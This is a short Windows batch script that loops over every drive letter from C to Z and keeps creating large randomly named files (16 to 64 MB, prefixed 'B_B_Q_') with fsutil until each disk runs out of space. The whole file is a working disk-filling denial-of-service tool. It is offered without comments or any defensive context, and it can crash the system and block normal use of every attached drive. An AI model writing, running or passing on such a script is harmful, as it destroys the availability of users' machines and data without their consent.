@echo off
setlocal enabledelayedexpansion

set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    set "Disk=%%d"
    if exist "%%d:\\" (
        call :fillDrive "%%d"
    )
)

:exit
exit /b

:fillDrive
setlocal
set "drive=%~1"

:fillLoop
set "randomName="
for /l %%a in (1,1,12) do (
    set /a "rand=!random! %% 62"
    for %%b in (!rand!) do set "randomName=!randomName!!characters:~%%b,1!"
)
set /a "size=!random! %% 49 + 16"
set /a "bigger=size * 1024 * 1024"
fsutil file createnew "%drive%:\B_B_Q_!randomName!" !bigger! >nul
if not errorlevel 1 (
    goto fillLoop
)
endlocal
exit /b
